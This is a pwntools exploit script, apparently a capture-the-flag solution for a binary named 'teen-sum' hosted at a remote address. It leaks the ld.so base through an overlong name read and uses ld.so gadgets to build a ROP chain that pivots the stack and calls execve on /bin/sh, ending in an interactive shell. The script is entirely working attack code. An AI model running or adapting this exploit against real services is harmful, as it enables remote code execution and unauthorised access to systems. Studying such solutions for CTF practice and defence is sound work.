from pwn import *

ld = ELF("./ld.so")
elf = ELF("./teen-sum")
libc = ELF("./libc.so.6")

#target = process([elf.path])
target = remote("34.71.103.59", 14141)

def sa(s, d):
    target.sendafter(s, d)

def sla(s, d):
    sa(s, d + "\n")

def set_name(name, sz = 0):
    if sz == 0:
        sz = len(name)
    sla(">", str(sz))
    sa (">", name)

set_name("B"*0x18, 0x28)
target.recvuntil("B"*0x18)
ld_base = u64(target.recvline().strip().ljust(8, '\x00')) - 0x00007ffff7fcffb0 + 0x00007ffff7fcf000
log.info("LD Base: " + hex(ld_base))

sla(">", "100")

xorRax = ld_base + 0x0000000000022fb9
popRsp = ld_base + 0x000000000000143a
popRdi = ld_base + 0x0000000000002518
popRsi = ld_base + 0x00000000000097c8
popRdxRbx = ld_base + 0x00000000000011b3
sysret = ld_base + 0x000000000001f2d9
fake_stack = ld_base + 0x00007ffff7ffd800 - 0x00007ffff7fcf000
movRaxRsi = ld_base + 0x0000000000001d13

for i in range(89):
    sla(">", str(xorRax))

#-----------10 numbers are here--------------
sla(">", str(xorRax))
sla(">", str(popRdi))
sla(">", str("0"))
sla(">", str(popRsi))
sla(">", str(fake_stack))
sla(">", str(popRdxRbx))
sla(">", str(0x1337))
sla(">", str(0x9008))
sla(">", str(sysret))
sla(">", str(popRsp))
sla(">", str(fake_stack))

sla(">", "1")

set_name("Leet haxxxxxor", 0x40)

print("Sendling final payload...")
payload = p64(popRdi) + p64(fake_stack + 8*11) + p64(popRsi) + p64(59) + p64(movRaxRsi) + p64(popRsi) + p64(0) + p64(popRdxRbx) + p64(0) + p64(0) + p64(sysret)
payload += "/bin/sh\x00"
target.sendline(payload)

target.interactive()